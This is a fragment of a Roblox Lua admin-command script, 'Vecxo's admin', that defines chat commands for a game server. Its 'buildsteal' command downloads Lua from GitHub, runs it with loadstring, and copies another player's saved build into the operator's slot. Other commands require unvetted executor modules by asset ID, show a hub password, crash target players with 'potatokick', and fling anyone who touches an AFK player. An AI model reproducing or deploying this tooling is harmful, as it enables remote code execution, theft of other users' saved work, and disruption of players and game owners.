				return game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/decryptionite/streaming/refs/heads/main/Kohls%20Admin%20House%20NP/unlocked_buildload_v1.lua")
			end)

			if success then
				local content = result
				local loaded, fail = loadstring(content)
				if loaded then
					loaded()
				else
					notfi(sender, "Vecxo's admin", "loaded shared._DEK")
				end
			else
				notfi(sender, "Vecxo's admin", "Failed to load shared._DEK")
			end
		end

		shared._DEK:Load(game:GetService("Workspace"), targetid, targetslot)

	end
})

addcmd({
	Name = "buildsteal",
	Aliases = {},
	Player = false,
	Function = function(sender, targets, arguments)

		if not shared._DEK then
			notfi(sender, "Vecxo's admin", "shared._DEK not found, importing..", 2)
			local success, result = pcall(function() -- decryptionite's build loader
				return game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/decryptionite/streaming/refs/heads/main/Kohls%20Admin%20House%20NP/unlocked_buildload_v1.lua")
			end)

			if success then
				local content = result
				local loaded, fail = loadstring(content)
				if loaded then
					loaded()
				else
					notfi(sender, "Vecxo's admin", "loaded shared._DEK")
				end
			else
				notfi(sender, "Vecxo's admin", "Failed to load shared._DEK")
			end
		end

		shared._DEK.Steal = nil

		function shared._DEK:Steal(Operator:number,OperatorSlot:number,Victim:number,VictimSlot:number) -- fix 4 kohles (allow 0)

			if not (Operator or Victim) then
				return
			end

			local RemoteParts = shared._DEK:GetStore(Victim,VictimSlot)
			if RemoteParts then
				local StolenParts = shared._DEK:LoadParts(RemoteParts,false)

				shared._DEK:SaveParts(StolenParts,Operator,OperatorSlot) -- Operator should be a UserId now.

			end

		end

		local plr = arguments[1]
		local plrid
		local plrslot = arguments[2]
		local pslot
		local target = arguments[3]
		local targetid
		local targetslot = arguments[4]
		local tslot

		if targetslot == "0" then
			tslot = nil
		end

		if plrslot == "0" then
			pslot = nil
		end

		if plr == "me" then
			plr = sender.Name
		end

		local argt = p(plr, sender)

		if #argt > 0 then
			plr = argt[1].Name
		end

		local success, fail = pcall(function()
			plrid = game.Players:GetUserIdFromNameAsync(plr)
		end)

		if fail then
			notfi(sender, "Vecxo's admin", "Failed to get UserId, is the name correct?")
			return
		end

		local success, fail = pcall(function()
			targetid = game.Players:GetUserIdFromNameAsync(target)
		end)

		if fail then
			notfi(sender, "Vecxo's admin", "Failed to get UserId, is the name correct?")
			return
		end

		local success, fail = pcall(function()
			shared._DEK:Steal(plrid, pslot, targetid, tslot)
		end)

		if success then
			notfi(sender, "Vecxo's admin", "Stole ".. target .."'s build (".. targetslot ..") and saved it to ".. plr .."'s slot (".. plrslot ..")")
		end

		if fail then
			notfi(sender, "Vecxo's admin", "Failed to steal ".. target .."'s build.")
		end

	end
})
--[[
addcmd({
	Name = "savebuild",
	Aliases = {},
	Player = false,
	Function = function(sender, targets, arguments)
		local arg = arguments[1]
		local slot = arguments[2]
		local parts = {}

		if arg == "me" then
			arg = sender.Name
		end

		local argt = p(arg, sender)

		local function save(p)
			
			if slot == nil then
				slot = "0"
			end
			
			local function c(d)
				return {
					x = d.X,
					y = d.Y,
					z = d.Z
				}
			end
			
			local function f(g)
				return {
					r = g.R,
					g = g.G,
					b = g.B
				}
			end
			
			local bss = game:GetService("DataStoreService"):GetDataStore("cxo_build_system".. tonumber(slot))
			for l, m in ipairs(workspace:GetDescendants()) do
				if m:IsA("BasePart") and (m.Name == "Part" or m.Name == "CornerWedge" or m.Name == "Wedge" or m.Name == "Truss") then
					table.insert(parts, {
						Name = tostring(m.Name),
						CFrame = tostring(m.CFrame),
						Size = c(m.Size),
						Color = f(m.Color),
						Material = m.Material.Name,
						Transparency = m.Transparency,
						Anchored = m.Anchored,
						CanCollide = m.CanCollide
					})
				end
			end
			local success, fail = pcall(function()
				bss:SetAsync(argt[1].UserId, parts)
			end)
			if success then
				notfi(sender, "Vecxo's admin", "Saved to slot ".. slot .. "!")
			else
				notfi(sender, "Vecxo's admin", "Failed to save: ".. fail)
			end
		end

		if #argt <= 0 then
			
		end

		
	end
})

addcmd({
	Name = "loadbuild",
	Aliases = {},
	Function = function(sender, targets, arguments)
		local slot = arguments[1]
		local saving = table.concat(arguments, " ", 2)
		local parts = {}
		
		if slot == nil then
			slot = "0"
		end
		
		local function c(d)
			return {
				x = d.X,
				y = d.Y,
				z = d.Z
			}
		end
		
		local function f(g)
			return {
				r = g.R,
				g = g.G,
				b = g.B
			}
		end
		
		for i, plr in ipairs(targets) do
			local bss = game:GetService("DataStoreService"):GetDataStore("cxo_build_system".. tonumber(slot))
			for l, m in ipairs(workspace:GetDescendants()) do
				if m:IsA("BasePart") and (m.Name == "Part" or m.Name == "CornerWedge" or m.Name == "Wedge" or m.Name == "Truss") then
					table.insert(parts, {
						Name = tostring(m.Name),
						CFrame = tostring(m.CFrame),
						Size = c(m.Size),
						Color = f(m.Color),
						Material = m.Material.Name,
						Transparency = m.Transparency,
						Anchored = m.Anchored,
						CanCollide = m.CanCollide
					})
				end
			end
			local success, fail = pcall(function()
				bss:SetAsync(plr.UserId, parts)
			end)
			if success then
				notfi(sender, "Vecxo's admin", "Saved to slot ".. slot .. "!")
			else
				notfi(sender, "Vecxo's admin", "Failed to save: ".. fail)
			end
		end
	end
})
]]
addcmd({
	Name = "exser",
	Aliases = {},
	Function = function(sender, targets, arguments)
		--if not restrictcheck(sender) then
		if not table.find(_G.Whitelist, tostring(sender.UserId)) then return end
		for i, plr in ipairs(targets) do
			local success, fail = pcall(function()
				require(10868847330):pls(plr.Name)
			end)

			if success then
				task.spawn(function()
					task.wait(1.5)
					notfi(plr, "Vecxo's admin", "The hub password is c00lkidds", 7)
				end)
			else
				notfi(plr, "Vecxo's admin", "Failed to load exser: ".. fail)
			end
		end
		--[[else
			notfi(sender, "Vecxo's admin", "restricted mode is enabled, this command can't be used.")
		end]]
	end
})

addcmd({
	Name = "sensation",
	Aliases = {},
	Function = function(sender, targets, arguments)
		if not restrictcheck(sender) then
			for i, plr in ipairs(targets) do
				local success, fail = pcall(function()
					require(100263845596551)(plr.Name, ColorSequence.new(Color3.fromRGB(71, 148, 253), Color3.fromRGB(71, 253, 160)), "Standard")
				end)

				if not success then
					notfi(plr, "Vecxo's admin", "Failed to load sensation hub: ".. fail)
				end
			end
		else
			notfi(sender, "Vecxo's admin", "restricted mode is enabled, this command can't be used.")
		end
	end
})

addcmd({
	Name = "robio",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			local success, fail = pcall(function()
				require(132909508523975):RO_BIO(plr.Name,"Both")
			end)

			if not success then
				notfi(plr, "Vecxo's admin", "Failed to load ro-bio: ".. fail)
			end
		end
	end
})

addcmd({
	Name = "dex",
	Aliases = {"ssdex"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			local success, fail = pcall(function()
				require(12146718110):Fire(plr.Name)
			end)

			if fail then
				notfi(sender, "Vecxo's admin", "Dex failed to load: ".. fail)
			else
				if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
					local ticking = tick()
					require(112354705578311).load() -- goog readder
					repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
				end

				task.wait(7.5)

				local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

				if not goog then
					warn("goog failed to be added, command can not continue")
					notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
					return
				end

				local scr = goog:FindFirstChild("Utilities").Client:Clone()
				local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

				loa.Parent = scr
				scr:WaitForChild("Exec").Value = [[
	
					workspace.Camera:ClearAllChildren()

					repeat task.wait() until not workspace.Camera:FindFirstChild("Part")

					script:Destroy()

				]]

				if plr.PlayerGui then
					scr.Parent = loa
				else
					scr.Parent = plr.Character
				end

				scr.Enabled = true
			end
		end
	end
})

addcmd({
	Name = "clientdex",
	Aliases = {"csdex"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			local success, fail = pcall(function()
				require(15827159924).MauDex(plr.Name)
			end)

			if fail then
				notfi(sender, "Vecxo's admin", "Dex failed to load: ".. fail)
			end
		end
	end
})

addcmd({
	Name = "motorcycle",
	Aliases = {"ghostrider"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			local success, fail = pcall(function()
				require(7473216460).load(plr.Name)
			end)

			if fail then
				notfi(sender, "Vecxo's admin", "Motorcycle failed to load: ".. fail)
			end
		end
	end
})

addcmd({
	Name = "tools",
	Aliases = {"gears"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			local success, fail = pcall(function()
				require(16052382566).PoopToolsV2(plr.Name)
			end)

			if fail then
				notfi(sender, "Vecxo's admin", "tools failed to load: ".. fail)
			end
		end
	end
})

addcmd({
	Name = "sledgehammer",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			local success, fail = pcall(function()
				require(8038037940).CLoad(plr.Name)
			end)

			if fail then
				notfi(sender, "Vecxo's admin", "sledge hammer failed to load: ".. fail)
			end
		end
	end
})

addcmd({
	Name = "creeper",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			local success, fail = pcall(function()
				require(4708818072).Oaeh(plr.Name)
			end)

			notfi(plr, "Vecxo's admin", "Press G to explode.")
		end
	end
})

addcmd({
	Name = "minecraft",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			local success, fail = pcall(function()
				require(96740567205611)(plr.Name)
			end)

			if fail then
				notfi(sender, "Vecxo's admin", "minecraft failed to load: ".. fail)
			end

		end
	end
})

addcmd({
	Name = "toolgun",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			local success, fail = pcall(function()
				require(7356751292).gmod(plr.Name)
			end)

			if fail then
				notfi(sender, "Vecxo's admin", "tool gun failed to load: ".. fail)
			end
		end
	end
})

addcmd({
	Name = "toolgun2",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			local success, fail = pcall(function()
				require(14108404712).mingebag(plr.Name)
			end)

			if fail then
				notfi(sender, "Vecxo's admin", "tool gun failed to load: ".. fail)
			end
		end
	end
})

addcmd({
	Name = "draw",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			local success, fail = pcall(function()
				require(115021406772544).r(plr.Name)
			end)

			if fail then
				notfi(sender, "Vecxo's admin", "draw failed to load: ".. fail)
			end
		end
	end
})

addcmd({
	Name = "ben",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			local success, fail = pcall(function()
				require(115021406772544).r(plr.Name,"ben")
			end)

			if fail then
				notfi(sender, "Vecxo's admin", "ben failed to load: ".. fail)
			end
		end
	end
})

addcmd({
	Name = "tom",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			local success, fail = pcall(function()
				require(115021406772544).r(plr.Name,"tom")
			end)

			if fail then
				notfi(sender, "Vecxo's admin", "tom failed to load: ".. fail)
			end
		end
	end
})

addcmd({
	Name = "bhop",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			local success, fail = pcall(function()
				require(115021406772544).r(plr.Name,"bhop")
			end)

			if fail then
				notfi(sender, "Vecxo's admin", "ben failed to load: ".. fail)
			end
		end
	end
})

addcmd({
	Name = "maxwell",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			local sus

			if game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Talking Maxwell") then
				game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Talking Maxwell").Parent = plr.Backpack
			end

			local success, fail = pcall(function()
				require(100506488790924).load("Talking Maxwell")
			end)

			if fail then
				notfi(sender, "Vecxo's admin", "maxwell failed to load: ".. fail)
			end

			game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("Talking Maxwell")
			game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Talking Maxwell").Parent = plr.Backpack

		end
	end
})

addcmd({
	Name = "killbot",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do

			local success, fail = pcall(function()
				require(100506488790924).load("Kill Bot")
			end)

			if fail then
				notfi(sender, "Vecxo's admin", "kill bot failed to load: ".. fail)
			end

			repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("Kill Bot", true)

			if plr.Character then
				game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Kill Bot").Parent = plr.Character
			else
				plr:LoadCharacter()
				game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Kill Bot").Parent = plr.Character
			end
		end
	end
})

addcmd({
	Name = "eerin",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do

			local success, fail = pcall(function()
				require(100506488790924).load("Eerin")
			end)

			if fail then
				notfi(sender, "Vecxo's admin", "eerin failed to load: ".. fail)
			end

			repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("Eerin", true)

			if plr.Character then
				game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Eerin").Enabled = true
				game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Eerin").Parent = plr.Character
			else
				plr:LoadCharacter()
				game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Eerin").Enabled = true
				game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Eerin").Parent = plr.Character
			end
		end
	end
})
--[[ causes insane server lag (no idea why i didnt make the require) so its commented out
addcmd({
	Name = "mario",
	Aliases = {"supermario"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do

			local success, fail = pcall(function()
				require(71286731275324).super3dbro(plr.Name)
			end)

			if fail then
				notfi(sender, "Vecxo's admin", "mario failed to load: ".. fail)
				return
			end

		end
	end
})
]]
addcmd({
	Name = "VRhands",
	Aliases = {"VirtualReality"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do

			local success, fail = pcall(function()
				require(122892358302274)(plr.Name, NoFace, VRSize)
			end)

			if fail then
				notfi(sender, "Vecxo's admin", "VRhands failed to load: ".. fail)
				return
			end

		end
	end
})

addcmd({
	Name = "synapse",
	Aliases = {"syn"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do

			if not table.find(synapsex, plr.UserId) then
				table.insert(synapsex, plr.UserId)
			end

			if plr.PlayerGui:FindFirstChild("SynapseXreal") then
				return
			end

			local s = Instance.new("ScreenGui", plr.PlayerGui)
			s.Name = "SynapseXreal"
			s.ResetOnSpawn = false

			if game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Synapse X") then
				game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Synapse X"):Clone().Parent = s
				return
			end

			local sus

			sus = game.ReplicatedStorage.DescendantAdded:Connect(function(v)
				if v.Name == "Synapse X" then
					repeat task.wait() until v.Parent ~= nil
					v:Clone().Parent = s
					sus:Disconnect()
				end
			end)

			local success, fail = pcall(function()
				require(100506488790924).load("Synapse X")
			end)

			if fail then
				notfi(sender, "Vecxo's admin", "Synapse X failed to load: ".. fail)
			end
		end
	end
})

addcmd({
	Name = "permwl",
	Aliases = {"hardwl"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if not restrictcheck(sender) then
				if not table.find(_G.Whitelist, tostring(plr.UserId)) then
					table.insert(_G.Whitelist, tostring(plr.UserId))
				end
			else
				notfi(sender, "Vecxo's admin", "restricted mode is enabled, this command can't be used.")
			end
		end
	end
})

addcmd({
	Name = "unpermwl",
	Aliases = {"unhardwl"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if not restrictcheck(sender) then
				if table.find(_G.Whitelist, tostring(plr.UserId)) then
					table.remove(_G.Whitelist, table.find(_G.Whitelist, tostring(plr.UserId)))
				end
			else
				notfi(sender, "Vecxo's admin", "restricted mode is enabled, this command can't be used.")
			end
		end
	end
})

addcmd({
	Name = "afk",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if afk[plr.Name] then return end
			afk[plr.Name] = plr
			local ps = plr.Character.HumanoidRootPart.CFrame

			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112354705578311).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[

				for i,v in pairs(game:GetDescendants()) do
					if v:IsA("Sound") then
						v.Volume = 0
					end
				end
			
				game.DescendantAdded:Connect(function(v)
					if v:IsA("Sound") then
						v.Volume = 0
						v:GetPropertyChangedSignal("Volume"):Connect(function()
							if v.Volume ~= 0 then
								v.Volume = 0
							end
						end)
					end
				end)

			]]

			if plr.PlayerGui then
				local s = Instance.new("ScreenGui", plr.PlayerGui)
				s.ResetOnSpawn = false
				s.Name = "AFK"
				scr.Parent = s
			else
				notfi(sender, "Vecxo's admin", "Failed to give you the sound muter, You may hear sounds.")
			end

			scr.Enabled = true

			local function wait4char()
				if not plr.Character then
					plr:LoadCharacter()
					repeat task.wait() until plr.Character
				end
			end

			while afk[plr.Name] do

				wait4char()

				local char = plr.Character
				if char then
					local hrp = char:FindFirstChild("HumanoidRootPart")
					if hrp then
						if (hrp.CFrame.Position - ps.Position).Magnitude >= 0.1 then
							hrp.CFrame = ps
						end
					else
						plr:LoadCharacter()
						task.wait(0.5)
						char = plr.Character
						hrp = char and char:FindFirstChild("HumanoidRootPart")
						if hrp then
							hrp.CFrame = ps
						end
					end
				else
					wait4char()
				end

				if not plr.Character:FindFirstChild("AntiTouch") then
					local v = Instance.new("Part", plr.Character)
					local w = Instance.new("WeldConstraint", v)
					v.Transparency = 1
					v.Size = Vector3.new(5,6,5)
					v.Name = "AntiTouch"
					v.CanCollide = true
					v.Locked = true
					v.CFrame = plr.Character:WaitForChild("HumanoidRootPart").CFrame
					w.Part0 = v
					w.Part1 = plr.Character:WaitForChild("HumanoidRootPart")
					v.Touched:Connect(function(t)
						local c = t.Parent
						local cn = c.Name
						if cn == plr.Name then return end
						if not c:FindFirstChild("Humanoid") then return c.Parent end

						if c:FindFirstChild("HumanoidRootPart") then
							local b = Instance.new("BodyGyro", c.Torso)
							b.MaxTorque = Vector3.new(-15e30, -15e30, -15e30)
						else
							game.Players:FindFirstChild(cn):LoadCharacter()
							local b = Instance.new("BodyGyro", c.Torso)
							b.MaxTorque = Vector3.new(-15e30, -15e30, -15e30)
						end
					end)
				end

				if not plr.Character:FindFirstChild("Head"):FindFirstChild("AFK") then
					local b = Instance.new("BillboardGui", plr.Character:WaitForChild("Head"))
					local t = Instance.new("TextLabel", b)
					b.Size = UDim2.new(0, 50, 0, 50)
					b.ExtentsOffset = Vector3.new(0, 1.2, 0)
					b.Name = "AFK"
					t.Size = UDim2.new(0, 50, 0, 20)
					t.BackgroundTransparency = 1
					t.Text = "[ AFK ]"
					t.TextSize = 20
					t.Font = Enum.Font.SourceSansBold
					t.Name = "TEXT"
				end
				task.wait()
			end
		end
	end
})

addcmd({
	Name = "unafk",
	Aliases = {"back"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if sender.UserId ~= 3222470105 then
				if sender.Name ~= plr.Name  then
					notfi(sender, "Vecxo's admin", "You can not unafk this player")
					return
				end
			end
			if afk[plr.Name] then
				afk[plr.Name] = nil
			end
			if plr.Character and plr.Character:FindFirstChild("Head") and plr.Character.Head:FindFirstChild("AFK") then
				plr.Character.Head:FindFirstChild("AFK"):Destroy()
			end
			if plr.Character and plr.Character:FindFirstChild("AntiTouch") then
				plr.Character.AntiTouch:Destroy()
			end
			if plr.PlayerGui and plr.PlayerGui:FindFirstChild("AFK") then
				plr.PlayerGui.AFK:Destroy()
			end

			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112354705578311).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[
			
				for i,v in pairs(game:GetDescendants()) do
					if v:IsA("Sound") then
						v.Volume = 1
					end
				end

			]]

			if plr.PlayerGui then
				scr.Parent = plr.PlayerGui
			else
				notfi(sender, "Vecxo's admin", "Failed to give you the sound unmuter, You may not hear sounds.")
			end

			scr.Enabled = true
		end
	end
})

addcmd({ -- kozy HATES indenting his code
	Name = "potatokick",
	Aliases = {"pkick"},
	Function = function(sender, targets, arguments)

		if not _G.nanp or not _G.naned then
			require(115021406772544).r("","poto")
		end

		for i, plr in ipairs(targets) do

			if not plr.Character then
				plr:LoadCharacter()
			elseif plr.Character and not plr.Character:FindFirstChild("HumanoidRootPart") then
				plr:LoadCharacter()
			end

			if not sender.Character then
				sender:LoadCharacter()
			elseif sender.Character and not sender.Character:FindFirstChild("HumanoidRootPart") then
				sender:LoadCharacter()
			end

			if not _G.nanp then
				repeat
					task.wait()
				until _G.nanp or timeout >= 15
			end

			local begin = tick()

			_G.nanp(plr)

			if _G.naned and typeof(_G.naned) ~= "table" then -- incase sum1 nil's it
				_G.naned = {}
			end

			if _G.rworded and typeof(_G.rworded) ~= "table" then -- incase sum1 nil's it
				_G.rworded = {}
			end

			local rnpos = sender.Character.HumanoidRootPart.CFrame

			if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("HotPotato") then
				local success, gear = pcall(function()
					return game:GetService("InsertService"):LoadAsset(25741198)
				end)

				if success and gear then
					local potato = gear:FindFirstChildOfClass("Tool")
					if potato then
						potato:Clone().Parent = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder")
						potato.Parent = sender.Backpack
						repeat task.wait() until potato.Parent == sender.Backpack or not game.Players:FindFirstChild(sender.Name)
						for i = 1,4 do
							potato:Clone().Parent = sender.Backpack
						end
					end
				end
			else
				for i = 1,5 do
					game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("HotPotato"):Clone().Parent = sender.Backpack
				end
			end

			plr.Character.HumanoidRootPart.Anchored = true
			local fortnitesus = true

			local co = coroutine.create(function()
				repeat
					sender.Character.HumanoidRootPart.CFrame = plr.Character.HumanoidRootPart.CFrame * CFrame.new(-1.5,0,2)
					task.wait()
				until fortnitesus == false
			end)

			coroutine.resume(co)

			local f = Instance.new("ForceField", plr.Character)
			local ff = Instance.new("ForceField", sender.Character)

			for i,v in pairs(sender.Backpack:GetChildren()) do
				if v:IsA("Tool") and v.Name == "HotPotato" then
					v.Parent = sender.Character
					v:Activate()
				end
			end

			repeat task.wait() until plr.Character:FindFirstChild("HotPotato")

			fortnitesus = false
			sender.Character.HumanoidRootPart.CFrame = rnpos
			ff:Destroy()

			for i,v in pairs(sender.Character:GetChildren()) do
				if v:IsA("Tool") and v.Name == "HotPotato" then
					v:Destroy()
				end
			end

			local timeout = tick()

			repeat task.wait() until table.find(_G.rworded, plr.Name) or tick() - timeout >= 5

			if table.find(_G.rworded, plr.Name) then
				local ended = tick()
				local takentime = ended - begin
				local kicktime

				if takentime < 1 then
					kicktime = string.format("%.0fms", takentime * 1000)
				else
					kicktime = string.format("%.1fs", takentime)
				end
				for i,p in pairs(workspace:GetChildren()) do
					if p:IsA("Tool") and p.Name == "HotPotato" then
						p:Destroy()
					end
				end
				for i,p in pairs(plr.Character:GetChildren()) do
					if p:IsA("Tool") and p.Name == "HotPotato" then
						p:Destroy()
					end
				end
				local b = Instance.new("BillboardGui", plr.Character:WaitForChild("Head"))
				local t = Instance.new("TextLabel", b)
				b.Size = UDim2.new(0, 50, 0, 50)
				b.ExtentsOffset = Vector3.new(0, 7, 0)
				b.Name = "KICKED"
				t.Size = UDim2.new(0, 50, 0, 20)
				t.BackgroundTransparency = 1

				notfi(sender, "Vecxo's admin", "Kicked ".. plr.Name .." in ".. kicktime)

				t.Text = "[ CRASHED ]\nin ".. kicktime
				t.TextSize = 25
				t.Font = Enum.Font.SourceSansBold
				t.TextColor3 = Color3.fromRGB(0, 255, 0)
				t.Name = "TEXT"
				t.Size = UDim2.new(0, t.TextBounds.X + 10, 0, t.TextBounds.Y + 10)
				b.Size = UDim2.new(0, t.TextBounds.X + 10, 0, t.TextBounds.Y + 10)
			end

		end
	end
})

addcmd({
	Name = "name",
	Aliases = {"billboard"},
	Function = function(sender, targets, arguments)
		local txt = table.concat(arguments, " ", 1)
		for i, plr in ipairs(targets) do

			if plr.Character and plr.Character.Head and plr.Character.Head:FindFirstChild("Custom Name") then
				plr.Character.Head["Custom Name"]:Destroy()
			end

			local gui = Instance.new("BillboardGui", plr.Character:FindFirstChild("Head"))
			gui.Name = "Custom Name"
			gui.Adornee = head
			gui.Size = UDim2.new(0, 100, 0, 40)
			gui.StudsOffset = Vector3.new(0, 3.5, 0)
			gui.AlwaysOnTop = true
			local label = Instance.new("TextLabel")
			label.Name = "Text"
			label.BackgroundTransparency = 1
			label.Text = txt
			label.Font = Enum.Font.SourceSansBold
			label.TextSize = 25
			label.TextColor3 = Color3.new(1, 1, 1)
			label.TextStrokeTransparency = 0.5
			label.Size = UDim2.new(1, 0, 1, 0)
			label.Parent = gui
			task.wait()
			label.Size = UDim2.new(0, label.TextBounds.X + 10, 0, label.TextBounds.Y + 6)
			gui.Size = label.Size
		end
	end
})

addcmd({
	Name = "createteam",
	Aliases = {"newteam"},
	Player = false,
	Function = function(sender, targets, arguments)
		local r, g, b, name

		function check(value)
			if not tonumber(value) then
				return
			end
			if tonumber(value) >= 0 and tonumber(value) <= 255 then
				return true
			else
				return false
			end
			--return value >= 0 and value <= 255
		end

		if #arguments >= 3 then
			if check(arguments[#arguments - 2]) and check(arguments[#arguments - 1]) and check(arguments[#arguments]) then
				r = tonumber(arguments[#arguments - 2])
				g = tonumber(arguments[#arguments - 1])
				b = tonumber(arguments[#arguments])
				name = table.concat(arguments, " ", 1, #arguments - 3)
			else
				r, g, b = math.random(0, 255), math.random(0, 255), math.random(0, 255)
				name = table.concat(arguments, " ")
			end
			if not (r and g and b) or r < 0 or r > 255 or g < 0 or g > 255 or b < 0 or b > 255 then
				r, g, b = math.random(0, 255), math.random(0, 255), math.random(0, 255)
			end
		else
			name = table.concat(arguments, " ")
			r, g, b = math.random(0, 255), math.random(0, 255), math.random(0, 255)
		end

		local t = Instance.new("Team", game.Teams)
		t.Name = name
		t.TeamColor = BrickColor.new(Color3.fromRGB(r, g, b))
		t.AutoAssignable = false
	end
})

addcmd({
	Name = "teamcolour",
	Aliases = {"teamcolor"},
	Player = false,
	Function = function(sender, targets, arguments)
		local r = tonumber(arguments[#arguments - 2])
		local g = tonumber(arguments[#arguments - 1])
		local b = tonumber(arguments[#arguments])
		local name = table.concat(arguments, " ", 1, #arguments - 3)
		local team = game.Teams:FindFirstChild(name)

		if not team then
			notfi(sender, "Vecxo's admin", "Team not found.")
			return
		end

		if not (r and g and b) or r < 0 or r > 255 or g < 0 or g > 255 or b < 0 or b > 255 then
			notfi(sender, "Vecxo's admin", "RGB values must be between 0 and 255.")
			r, g, b = math.random(0, 255), math.random(0, 255), math.random(0, 255)
		end

		for i,v in pairs(game.Players:GetPlayers()) do
			if v.Team == team then
				v.Team.TeamColor = BrickColor.new(Color3.fromRGB(r, g, b))
			end
		end

		team.TeamColor = BrickColor.new(Color3.fromRGB(r, g, b))

	end
})

addcmd({
	Name = "setteam",
	Aliases = {"teamset"},
	Function = function(sender, targets, arguments)
		local name = table.concat(arguments, " ")
		for i, plr in ipairs(targets) do
			if game.Teams:FindFirstChild(name) then
				--[[if game.Teams:FindFirstChild(name):FindFirstChild("Rainbow") then
					coroutine.resume(coroutine.create(function()
						while game.Teams:FindFirstChild(name).Rainbow do
							plr.TeamColor = game.Teams:FindFirstChild(name).TeamColor
							task.wait()
						end
					end))
				end]]
				plr.Team = game.Teams:FindFirstChild(name)
			end
		end
	end
})

addcmd({
	Name = "deleteteam",
	Aliases = {"destroyteam"},
	Player = false,
	Function = function(sender, targets, arguments)
		local name = table.concat(arguments, " ")
		if game.Teams:FindFirstChild(name) then
			game.Teams:FindFirstChild(name):Destroy()
		else
			notfi(sender, "Vecxo's admin", "Team not found.")
		end
	end
})

local cats = {
	"10494482900",
	"18697484991",
	"7845396131",
	"14900934790",
	"17107493803",
	"15952023726",
	"18954826056",
	"12869438521",
	"2763593752",
	"5430597569",
	"18177771988",
	"18740086333",
	"17825784678",
	"14221072680",
	"12545034074",
	"66031236",
}

addcmd({ -- credits 2 adonis admin for the idea and the mesh + decal code
	Name = "png",
	Aliases = {"image"},
	Function = function(sender, targets, arguments)
		local id = arguments[1]

		for i, plr in ipairs(targets) do

			for i,v in pairs(plr.Character:GetDescendants()) do
				if v:IsA("BasePart") then
					v.Transparency = 1
				elseif v:IsA("Accessory") then
					v:Destroy()
				end
				if v.Name == "PNG" or v.Name == "image" then
					v:Destroy()
				end
